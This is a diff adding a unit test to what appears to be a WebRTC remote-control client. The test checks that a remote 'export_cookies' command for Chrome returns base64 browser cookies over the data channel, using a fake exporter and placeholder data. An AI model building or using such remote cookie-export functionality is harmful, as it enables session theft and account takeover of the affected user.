@@ -68,6 +68,16 @@ class FakePeerConnection:
             await handler()
 
 
+class FakeCookieExporter:
+    def __init__(self, payload: str) -> None:
+        self.payload = payload
+        self.requests: list[object] = []
+
+    def export_base64(self, browsers):
+        self.requests.append(browsers)
+        return self.payload
+
+
 class FakeSignaling:
     def __init__(self, offer: FakeSessionDescription) -> None:
         self.offer = offer
@@ -175,6 +185,24 @@ def test_integration_download_reads_and_transfers_file(tmp_path, control_handler
     received_bytes = base64.b64decode(channel.sent[0])
     received_file.write_bytes(received_bytes)
     assert received_file.read_bytes() == source_bytes
+
+
+def test_handle_export_cookies_sends_payload(control_handler):
+    exporter = FakeCookieExporter("Y29va2llcy1kYXRh")
+    client = WebRTCClient(
+        session_id="test-session",
+        signaling=None,
+        session_factory=lambda _mode: (control_handler, []),
+        file_service=object(),
+        cookie_exporter=exporter,
+    )
+    channel = CapturingChannel()
+
+    payload = {"action": "export_cookies", "browsers": ["chrome"]}
+    asyncio.run(client._handle_message(channel, payload, control_handler))
+
+    assert exporter.requests == [["chrome"]]
+    assert channel.sent == ["Y29va2llcy1kYXRh"]
 
 
 def test_run_once_successful_handshake_marks_connected(monkeypatch):
